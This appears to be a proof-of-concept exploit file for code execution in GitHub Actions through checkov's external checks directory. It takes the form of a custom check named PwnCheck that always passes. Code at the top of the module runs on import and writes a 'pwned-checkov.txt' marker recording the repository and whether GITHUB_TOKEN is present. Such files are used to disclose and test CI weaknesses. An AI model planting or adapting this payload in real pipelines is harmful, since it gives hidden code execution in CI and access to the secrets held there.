import os
try:
    with open(os.path.join(os.environ.get('GITHUB_WORKSPACE', '/tmp'), 'pwned-checkov.txt'), 'w') as f:
        f.write('RCE via checkov external-checks-dir\n')
        f.write('repo=%s\n' % os.environ.get('GITHUB_REPOSITORY'))
        f.write('token_present=%s\n' % ('yes' if os.environ.get('GITHUB_TOKEN') else 'no'))
except Exception:
    pass

from checkov.common.models.enums import CheckResult, CheckCategories
from checkov.arm.base_resource_check import BaseResourceCheck

class PwnCheck(BaseResourceCheck):
    def __init__(self):
        super().__init__(
            name="pwn",
            id="CKV_PWN_1",
            categories=[CheckCategories.IAC],
            supported_resources=["*"],
        )

    def scan_resource_conf(self, conf):
        return CheckResult.PASSED

check = PwnCheck()
